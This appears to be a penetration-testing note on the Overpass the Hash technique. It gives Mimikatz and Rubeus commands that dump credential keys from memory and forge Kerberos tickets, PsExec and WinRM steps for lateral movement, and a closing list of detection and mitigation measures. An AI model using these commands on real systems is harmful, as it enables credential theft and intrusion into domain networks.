---
tags:
  - "#type/technique"
  - "#tactic/TA0008"
  - "#technique/T1550.002"
  - "#technique/T1558.003"
  - "#stage/lateral-movement"
  - "#os/windows"
  - "#protocol/kerberos"
  - "#protocol/ntlm"
  - "#tool/mimikatz"
  - "#tool/rubeus"
aliases:
  - Overpass the Hash
  - Pass the Key
  - NTLM to Kerberos
---

## Technique
___

Overpass the Hash (OPtH) is a technique that allows an attacker to convert a user's NTLM or AES hash into a Kerberos ticket (TGT), effectively transitioning from NTLM authentication to Kerberos authentication. This technique is sometimes called "Pass the Key" because it can use AES keys rather than just NTLM hashes.

The advantage of Overpass the Hash over standard Pass the Hash is that it:
1. Provides a fully functional Kerberos ticket, which can access any Kerberos-authenticated service
2. Bypasses restrictions that may exist on NTLM authentication
3. Allows access to services that exclusively use Kerberos
4. Creates fewer suspicious events and generally has better operational security

## Prerequisites
___

**Access Level:** 
- To obtain hashes: Administrative access to the system where the user's credentials are cached
- To perform the attack: Standard user access to execute the attack tools

**System State:**
- Target system must have valid credentials cached (NTLM hash or Kerberos encryption keys)
- Network access to a domain controller for Kerberos ticket requests

**Information Needed:**
- Username
- Domain name
- User's NTLM hash or Kerberos encryption keys (AES256, AES128, or RC4)

## Considerations
___

**Impact**

Overpass the Hash provides the ability to impersonate a user for any Kerberos-authenticated resource in the domain, which can lead to:
- Access to file shares
- Access to internal web applications
- Remote management capabilities
- Database access
- Other domain resource access

**OPSEC**

- More stealthy than traditional Pass the Hash as it generates normal Kerberos traffic
- Creates legitimate Kerberos tickets that are difficult to distinguish from regular authentication
- Less likely to trigger alerts compared to direct NTLM authentication attempts
- Still creates event logs for Kerberos TGT requests that can be monitored

## Execution
___

### Using Mimikatz

1. **Extract encryption keys** (administrative access required):
```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

2. **Perform Overpass the Hash with NTLM hash**:
```powershell
mimikatz # sekurlsa::pth /user:username /domain:domain.local /ntlm:e2b475c11da2a0748290d87aa966c327 /run:cmd.exe
```

3. **Perform Overpass the Hash with AES key (more secure and stealthy)**:
```powershell
mimikatz # sekurlsa::pth /user:username /domain:domain.local /aes256:b9d74be0d7965c20cd0a2ea101be6eee4886cb52b9a496e8bc96313cd151d2db /run:cmd.exe
```

4. **From the spawned command prompt, force Kerberos authentication**:
```cmd
klist purge
net use \\server.domain.local\share
```

### Using Rubeus

1. **Extract encryption keys** (multiple options):
```powershell
# Using Rubeus (doesn't require admin for asktgt, but does for dumping keys)
Rubeus.exe dump

# Or using Mimikatz as shown above
mimikatz # sekurlsa::ekeys
```

2. **Request a TGT with NTLM hash**:
```powershell
Rubeus.exe asktgt /user:username /domain:domain.local /rc4:e2b475c11da2a0748290d87aa966c327 /ptt
```

3. **Request a TGT with AES key**:
```powershell
Rubeus.exe asktgt /user:username /domain:domain.local /aes256:b9d74be0d7965c20cd0a2ea101be6eee4886cb52b9a496e8bc96313cd151d2db /ptt
```

4. **Verify the ticket was injected**:
```powershell
klist
```

### Combined Approach (Extract and Use)

1. **Extract credentials from the current system**:
```powershell
Rubeus.exe dump /nowrap
```

2. **Use the extracted hash/key to request a TGT**:
```powershell
Rubeus.exe asktgt /user:username /domain:domain.local /rc4:e2b475c11da2a0748290d87aa966c327 /ptt
```

3. **Access resources using the injected ticket**:
```powershell
# Access a file share
dir \\server.domain.local\share

# Execute commands on a remote system
PsExec.exe \\server.domain.local cmd.exe

# Connect to a remote system with WinRM
Enter-PSSession -ComputerName server.domain.local
```

## Detection & Mitigation
___

### Detection

- Monitor for TGT requests from unexpected systems or for unexpected users
- Look for multiple TGT requests for different users from the same system
- Watch for unusual access patterns following TGT issuance
- Monitor for credential dumping activities that often precede Overpass the Hash
- Look for processes spawned with explicit credentials in command-line parameters

### Mitigation

- Implement credential guard to protect credential material in memory
- Use Protected Users security group for privileged accounts
- Enforce strong authentication policies
- Implement time-based restrictions on privileged account usage
- Deploy Privileged Access Workstations (PAWs) for administrative tasks
- Use Just-In-Time (JIT) administration to limit persistent admin rights
- Implement network segmentation to restrict lateral movement
- Deploy Advanced Threat Analytics or Microsoft Defender for Identity to detect suspicious Kerberos activity